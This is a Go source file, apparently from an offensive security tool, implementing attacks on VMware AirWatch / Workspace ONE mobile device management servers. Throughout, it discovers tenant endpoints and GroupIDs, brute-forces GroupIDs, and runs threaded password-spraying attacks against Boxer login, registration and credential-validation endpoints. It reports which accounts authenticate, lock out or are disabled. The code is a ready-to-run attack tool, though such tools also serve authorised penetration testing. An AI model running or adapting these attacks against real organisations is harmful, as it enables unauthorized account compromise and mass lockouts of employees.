package airwatch

import (
	"fmt"
	"strings"
	"time"

	"net/http"
	URL "net/url"

	"github.com/mr-pmillz/dauthi/utils"
)

// MDMA ...
type MDMA struct {
	Opts      utils.ChargeOpts
	Logr      *utils.Logger
	Groups    map[string]int
	SID       string
	SAMLURL   string
	TenantURL string
	Cycle
}

// Cycle ...
type Cycle struct {
	Buff   *chan bool
	Block  *chan bool
	Length int
	API    *utils.API
}

// Class global constant values
const (
	// Usage is tool usage options
	Usage = `
  AirWatch Options:
    -a                     User-Agent [default: Agent/20.08.0.23/Android/11]

    -email                 Target email
    -gid                   AirWatch GroupID Value
    -sgid                  AirWatch sub-GroupID Value
    -sint                  AirWatch sub-GroupID INT value (Associated to multiple Groups)
  `
	// Methods are available tool methods
	Methods = `
  AirWatch Methods:
    Disco                  GroupID discovery query
    Prof                   GroupID validation query
    enum-gid               GroupID brute-force enumeration
    Auth-box-login         Boxer login SFA attack (Requires Email)
    Auth-box-reg           Boxer MDM registration SFA attack (Requires Email)
    Auth-box-lgid          Boxer login SFA attack w/ multi-group tenants
    Auth-val               AirWatch single-factor credential validation attack
	`

	domainLookupV1          = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v1/domainlookup/domain/%s`
	domainLookupV2          = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v2/domainlookup/domain/%s`
	gbdomainLookupV2        = `https://discovery.awmdm.com/autodiscovery/DeviceRegistry.aws/v2/gbdomainlookup/domain/%s`
	catalogPortal           = `https://%s/catalog-portal/services/api/adapters`
	emailDiscovery          = `https://%s/DeviceManagement/Enrollment/EmailDiscovery`
	validateGroupIdentifier = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier`
	// validateGroupSelector   = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupselector`
	authenticationEndpoint = `https://%s/deviceservices/authenticationendpoint.aws`
	// authenticationEmailDisco = `https://%s/DeviceManagement/Enrollment/UserAuthentication`
	validateLoginCredentials = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials` //nolint:gosec
	workspaceoneLookup       = `%s/catalog-portal/services/API/adapters`

	validateUserCredentials = `/DeviceManagement/Enrollment/Validate-userCredentials`

	POSTemailDiscovery          = `DevicePlatformId=2&EmailAddress=%s&FromGroupID=False&FromWelcome=False&Next=Next`
	POSTvalidateGroupIdentifier = `{"Header":{"SessionId":"00000000-0000-0000-0000-000000000000"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s"}`
	// POSTvalidateGroupSelector      = `{"Header":{"SessionId":"%s"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s","LocationGroupId":%d}`
	POSTauthenticationEndpointJSON = `{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",` +
		`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s","AuthenticationGroup":"com.air-watch.boxer"}`
	POSTauthenticationEndpointXML = `<AWAuthenticationRequest><Username><![CDATA[%s]]></Username><Password><![CDATA[%s]]></Password>` +
		`<ActivationCode><![CDATA[%s]]></ActivationCode><BundleId><![CDATA[com.boxer.email]]></BundleId><Udid><![CDATA[%s]]>` +
		`</Udid><DeviceType>5</DeviceType><AuthenticationType>2</AuthenticationType><AuthenticationGroup><![CDATA[com.boxer.email]]>` +
		`</AuthenticationGroup></AWAuthenticationRequest>`
	POSTvalidateLoginCredentials = `{"Username":"%s","Password":"%s","Header":{"SessionId":"%s"},"SamlCompleteUrl":"aw:\/\/","Device":{"InternalIdentifier":"%s"}}` //nolint:gosec
	// POSTemailDiscoAuth           = `SessionId=%s&DevicePlatformId=0&IsAndroidManagementApiEnrollment=False&UserName=%s&Password=%s&Next=Next`
	GET          = `GET`
	POST         = `POST`
	authBoxLGID  = "Auth-box-lgid"
	enumGID      = "enum-gid"
	authVal      = "Auth-val"
	authBoxReg   = "Auth-box-reg"
	authBoxLogin = "Auth-box-login"
	authEndpoint = `authenticationEndpoint`
)

// Init MDMA with default values and return obj
func Init(o utils.ChargeOpts) *MDMA {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	if o.RUUID {
		o.UUID = utils.RandUUID(21)
	}
	log := utils.NewLogger("airwatch")

	return &MDMA{
		Opts: o,
		Logr: log,
		Cycle: Cycle{
			API: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

func (m *MDMA) Disco1() bool {
	m.Cycle.API.Name = `domainLookupV1`
	m.Cycle.API.URL = fmt.Sprintf(domainLookupV1, m.Opts.Endpoint)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.Opts.Agent}}}

	m.Cycle.API.WebCall()

	return m.Cycle.API.Resp.Status == 200
}

func (m *MDMA) Disco2() bool {
	m.Cycle.API.Name = `domainLookupV2`
	m.Cycle.API.URL = fmt.Sprintf(domainLookupV2, m.Opts.Endpoint)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.Opts.Agent}}}

	m.Cycle.API.WebCall()

	return m.Cycle.API.Resp.Status == 200
}

func (m *MDMA) Disco3() bool {
	m.Cycle.API.Name = `gbdomainLookupV2`
	m.Cycle.API.URL = fmt.Sprintf(gbdomainLookupV2, m.Opts.Endpoint)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.Opts.Agent}}}

	m.Cycle.API.WebCall()

	return m.Cycle.API.Resp.Status == 200
}

func (m *MDMA) Disco4() bool {
	m.Cycle.API.Name = `catalogPortal`
	m.Cycle.API.URL = fmt.Sprintf(catalogPortal, m.SAMLURL)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent":   []string{m.Opts.Agent},
			"Content-Type": []string{"application/x-www-form-urlencoded"},
			"Accept":       []string{"gzip, deflate"}}}

	m.Cycle.API.WebCall()

	return m.Cycle.API.Resp.Status == 200
}

func (m *MDMA) Disco5() bool {
	m.Cycle.API.Name = `emailDiscovery`
	m.Cycle.API.URL = fmt.Sprintf(emailDiscovery, m.Opts.Endpoint)
	m.Cycle.API.Data = fmt.Sprintf(POSTemailDiscovery, m.Opts.Email)
	m.Cycle.API.Method = POST
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent":   []string{m.Opts.Agent},
			"Content-Type": []string{"application/x-www-form-urlencoded"},
			"Accept":       []string{"gzip, deflate"}}}

	if m.Opts.Debug > 0 {
		m.Cycle.API.Opts = &map[string]interface{}{
			"CheckRedirect": func(req *http.Request, via []*http.Request) error {
				if _, ok := req.URL.Query()["SID"]; ok {
					if len(req.URL.Query()["SID"]) < 1 {
						return fmt.Errorf("invalid SID Length - emailDiscovery Failed")
					}
					if req.URL.Query()["SID"][0] == "00000000-0000-0000-0000-000000000000" {
						return fmt.Errorf("invalid SID - emailDiscovery Disabled")
					}
				} else {
					return fmt.Errorf("emailDiscovery Failed")
				}

				// Provide debugging for modified redirect calls within AirWatch authentication API
				m.Logr.Debugf([]interface{}{"emailDiscovery"}, "Original Redirect: %s", req.URL)
				req.URL.Path = validateUserCredentials
				m.Logr.Debugf([]interface{}{"emailDiscovery"}, "Modified Redirect: %s", req.URL)
				return nil
			}}
	} else {
		m.Cycle.API.Opts = &map[string]interface{}{
			"CheckRedirect": func(req *http.Request, via []*http.Request) error {
				if _, ok := req.URL.Query()["SID"]; ok {
					if len(req.URL.Query()["SID"]) < 1 {
						return fmt.Errorf("invalid SID Length - emailDiscovery Failed")
					}
					if req.URL.Query()["SID"][0] == "00000000-0000-0000-0000-000000000000" {
						return fmt.Errorf("invalid SID - emailDiscovery Disabled")
					}
				} else {
					return nil
				}

				req.URL.Path = validateUserCredentials
				return nil
			}}
	}
	m.Cycle.API.WebCall()

	return m.Cycle.API.Resp.Status == 200
}

// Clone copies an *MDMA for process threading
func (m *MDMA) Clone() *MDMA {
	clone := Init(m.Opts) // assign target
	clone.Cycle.Block = m.Cycle.Block
	clone.Cycle.Buff = m.Cycle.Buff

	return clone
}

// Parser Wrapper to parse JSON/XML objects
func (m *MDMA) Parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.Cycle.API.Resp.ParseJSON(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.Cycle.API.Resp.ParseXML(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

// Disco representes the discovery process to locate and AirWatch
// authentication endpoint and GroupID
func (m *MDMA) Disco() {
	urls := []func() bool{
		m.Disco1,
		m.Disco2,
		m.Disco3,
		m.Disco4,
		m.Disco5,
	}

	for _, url := range urls {
		url()
		if m.Cycle.API.Resp.Status == 200 {
			break
		}
	}

	m.Validate()
}

// DiscoTenant leverages VMWare AirWatch's WorkspaceONE API
// to pull GID details.
func (m *MDMA) DiscoTenant() {
	m.Cycle.API.Name = `workspaceOneLookup`
	m.Cycle.API.URL = fmt.Sprintf(workspaceoneLookup, m.TenantURL)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{"awjade/9.5 (HubApp) (com.airwatch.vmworkspace; build: 23.01.1.1; Android: 11;nativenav)"}}}

	m.Cycle.API.WebCall()

	if m.Cycle.API.Resp.Status != 200 {
		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "WorkSpaceOne Lookup Failure")
		return
	}

	m.Validate()
}

// Prof represents the function call to Validate the setup
// of the AirWatch environment. Some request methods are executed
// across two queries where details from the first request need to be
// injected to the MDMA object.
func (m *MDMA) Prof() {
	m.Cycle.API.Name = `validateGroupIdentifier`
	m.Cycle.API.URL = fmt.Sprintf(validateGroupIdentifier, m.Opts.Endpoint)
	m.Cycle.API.Data = fmt.Sprintf(POSTvalidateGroupIdentifier, m.Opts.UUID, m.Opts.GroupID)
	m.Cycle.API.Method = POST
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent":   []string{m.Opts.Agent},
			"Content-Type": []string{"application/json"}}}

	m.Cycle.API.WebCall()
	if m.Cycle.API.Resp.Status != 200 {
		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Profiling Failed")
		return
	}

	m.Validate()
}

// Auth represents the setup framework to build the
// various authentication attack methods
func (m *MDMA) Auth() {
	var file []byte
	var err error

	if m.Opts.File != "" {
		file, err = utils.ReadFile(m.Opts.File)
		if err != nil {
			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.Opts.Threads)
	buff := make(chan bool, len(lines))
	m.Cycle.Block = &block
	m.Cycle.Buff = &buff
	m.Cycle.Length = len(lines)

	if m.Opts.Method != authBoxLGID {
		m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)
	}
	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.Cycle.Buff <- false
			continue
		}

		target := m.Clone()

		switch m.Opts.Method {
		case enumGID:
			if line != "" {
				target.Opts.GroupID = line
			}
			target.Cycle.API.Name = authEndpoint
			target.Cycle.API.URL = fmt.Sprintf(authenticationEndpoint, target.Opts.Endpoint)
			target.Cycle.API.Data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.Opts.GroupID, target.Opts.UUID, target.Opts.UserName, target.Opts.Password)
			target.Cycle.API.Method = POST
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.Opts.Agent},
					"Content-Type": []string{"application/json"},
					"Accept":       []string{"application/json; charset=utf-8"}}}

		case authBoxLogin:
			if line != "" {
				target.Opts.UserName = line
			}
			target.Cycle.API.Name = authEndpoint
			target.Cycle.API.URL = fmt.Sprintf(authenticationEndpoint, target.Opts.Endpoint)
			target.Cycle.API.Data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.Opts.GroupID, target.Opts.UUID, target.Opts.UserName, target.Opts.Password)
			target.Cycle.API.Method = POST
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.Opts.Agent},
					"Content-Type": []string{"application/json; charset=utf-8"},
					"Accept":       []string{"application/json; charset=utf-8"}}}

		case authBoxReg:
			if line != "" {
				target.Opts.UserName = line
			}
			target.Cycle.API.Name = authEndpoint
			target.Cycle.API.URL = fmt.Sprintf(authenticationEndpoint, target.Opts.Endpoint)
			target.Cycle.API.Data = fmt.Sprintf(POSTauthenticationEndpointXML, target.Opts.UserName, target.Opts.Password, target.Opts.GroupID, target.Opts.UUID)
			target.Cycle.API.Method = POST
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.Opts.Agent},
					"Content-Type": []string{"application/json"}}}

		case authVal:
			target.Prof() // capture SID
			if line != "" {
				target.Opts.UserName = line
			}

			target.Cycle.API.Name = `validateLoginCredentials`
			target.Cycle.API.URL = fmt.Sprintf(validateLoginCredentials, target.Opts.Endpoint)
			target.Cycle.API.Data = fmt.Sprintf(POSTvalidateLoginCredentials, target.Opts.UserName, target.Opts.Password, target.SID, target.Opts.UUID)
			target.Cycle.API.Method = POST
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.Opts.Agent},
					"Content-Type": []string{"UTF-8"},
					"Accept":       []string{"application/json"}}}

		case authBoxLGID:
			target.Prof() // capture SubGroups
			if line != "" {
				target.Opts.UserName = line
			}
			m.Logr.Infof(nil, "threading %d values across %d threads", len(lines)*len(target.Groups), target.Opts.Threads)

			for key, val := range target.Groups {
				target.Opts.SubGroup = key
				target.Opts.SubGroupINT = val

				target.Cycle.API.Name = authEndpoint
				target.Cycle.API.URL = fmt.Sprintf(authenticationEndpoint, target.Opts.Endpoint)
				target.Cycle.API.Data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.Opts.SubGroup, target.Opts.UUID, target.Opts.UserName, target.Opts.Password)
				target.Cycle.API.Method = POST
				target.Cycle.API.Opts = &map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent":   []string{target.Opts.Agent},
						"Content-Type": []string{"application/json; charset=utf-8"},
						"Accept":       []string{"application/json; charset=utf-8"}}}

				target.Thread()
			}
			continue
		}
		target.Thread()
	}
	for i := 0; i < m.Cycle.Length; i++ {
		<-*m.Cycle.Buff
	}
	close(*m.Cycle.Block)
	close(*m.Cycle.Buff)
}

// Thread represents the threading process to loop multiple requests
func (m *MDMA) Thread() {
	*m.Cycle.Block <- true
	go func() {
		m.API.WebCall()
		if m.API.Resp.Status == 0 {
			if m.Opts.Miss < m.Opts.Retry {
				m.Opts.Miss++
				m.Logr.Infof([]interface{}{m.Opts.GroupID, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
				<-*m.Cycle.Block
				m.Thread()
				return
			}
			m.Logr.Errorf([]interface{}{m.Opts.GroupID, m.Opts.UserName, m.Opts.Password}, "Null Response")
		}
		m.Validate()

		// Sleep interval through Thread loop
		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)

		<-*m.Cycle.Block
		*m.Cycle.Buff <- false
	}()
}

func (m *MDMA) Validate() {
	switch m.Opts.Method {
	case "disco", "DiscoTenant":
		var check struct {
			EnrollURL   string `json:"EnrollmentUrl"`
			GroupID     string `json:"GroupId"`
			TenantGroup string `json:"TenantGroup"`
			GreenboxURL string `json:"GreenboxUrl"`
			MDM         struct {
				ServiceURL string `json:"deviceServicesUrl"`
				APIURL     string `json:"apiServerUrl"`
				GroupID    string `json:"organizationGroupId"`
			} `json:"mdm"`
			Status  int    `json:"Status"`
			Message string `json:"Message"`
		}

		if m.Parser(&check, "json") {
			return
		}

		switch {
		case check.EnrollURL != "":
			endp, _ := URL.Parse(check.EnrollURL)
			m.Logr.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
		case check.GreenboxURL != "":
			endp, _ := URL.Parse(check.GreenboxURL)
			m.SAMLURL = endp.Hostname()
			m.Logr.Successf([]interface{}{endp.Hostname()}, "SAML Endpoint Discovery")
		case check.MDM.ServiceURL != "":
			endp, _ := URL.Parse(check.MDM.ServiceURL)
			m.Logr.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
		}

		switch {
		case check.GroupID != "":
			m.Logr.Successf([]interface{}{check.GroupID}, "GroupID Discovery")
		case check.TenantGroup != "":
			m.Logr.Successf([]interface{}{check.TenantGroup}, "Tenant Discovery")
			if strings.Contains(check.GreenboxURL, "workspaceoneaccess") {
				m.TenantURL = check.GreenboxURL
				m.DiscoTenant()
			}
		case check.MDM.GroupID != "":
			m.Logr.Successf([]interface{}{check.MDM.GroupID}, "Org GroupID Discovery")
		}

		if check.Status == 9 {
			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed: %s", check.Message)
		}

	case "prof":
		var check struct {
			Next struct {
				Type int `json:"Type"`
			} `json:"NextStep"`
		}
		if m.Parser(&check, "json") {
			return
		}

		switch check.Next.Type {
		case 1:
			m.Logr.Failf([]interface{}{check.Next.Type}, "Registration Disabled")
		case 2:
			m.Logr.Successf([]interface{}{check.Next.Type}, "AirWatch Single-Factor Registration")
		case 4:
			m.Logr.Successf([]interface{}{check.Next.Type}, "Single-Factor Registration")
		case 8:
			m.Logr.Successf([]interface{}{check.Next.Type}, "Token Registration")
		case 18:
			m.Logr.Successf([]interface{}{check.Next.Type}, "SAML Registration")
		default:
			m.Logr.Errorf([]interface{}{check.Next.Type}, "Unknown Registration")
		}

	case authVal:
		var check struct {
			Status struct {
				Code         int    `json:"Code"`
				Notification string `json:"Notification"`
			} `json:"Status"`
		}
		if m.Parser(&check, "json") {
			return
		}

		switch check.Status.Code {
		case 1:
			m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Successful: %s", check.Status.Notification)
		case 2, 0:
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Failure: %s", check.Status.Notification)
		default:
			m.Logr.Errorf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Unknown Response: %s", check.Status.Notification)
		}

	case enumGID, authBoxReg, authBoxLogin:
		if m.Cycle.API.Resp.Status != 200 {
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, m.Cycle.API.Resp.Status}, "Invalid response code")
			return
		}
		var check struct {
			StatusCode string `json:"StatusCode"`
		}
		if m.Parser(&check, "json") {
			return
		}

		switch check.StatusCode {
		case "AUTH--1":
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, check.StatusCode}, "Invalid GroupID/Username")
		case "AUTH-1001":
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, check.StatusCode}, "Authentication Failure")
		case "AUTH-1002":
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, check.StatusCode}, "Account Lockout")
		case "AUTH-1003":
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, check.StatusCode}, "Account Disabled")
		case "AUTH-1006":
			m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password, check.StatusCode}, "Authentication Successful")

		default:
			m.Logr.Errorf([]interface{}{m.Opts.UserName, m.Opts.Password, check.StatusCode}, "Unknown Response")
		}
	}
}

// Call represents the switch function for activating all class methods
func (m *MDMA) Call() {
	if m.Opts.Endpoint == "" {
		m.Logr.Errorf(nil, "FQDN or Authentication endpoint required")
		return
	}
	switch m.Opts.Method {
	case "disco":
		if m.Opts.Email == "" {
			email := "dave@" + m.Opts.Endpoint
			m.Logr.Infof([]interface{}{m.Opts.Method}, "Using sample email: %s", email)
			m.Opts.Email = email
		}
		m.Disco()
	case "prof":
		if m.Opts.GroupID == "" && (m.Opts.SubGroup == "" || m.Opts.SubGroupINT == 0) {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "GroupID/SubGroup and/or SubGroupINT required")
			return
		}
		m.Prof()
	case authBoxReg, authBoxLogin:
		if m.Opts.Email == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/Password or File/Password required")
			return
		}
		m.Opts.UserName = m.Opts.Email
		m.Auth()

	case enumGID, authBoxLGID, authVal:
		if m.Opts.UserName == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Username/Password or File/Password required")
			return
		}
		m.Auth()

	default:
		m.Logr.StdOut(Methods)
		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
	}
}
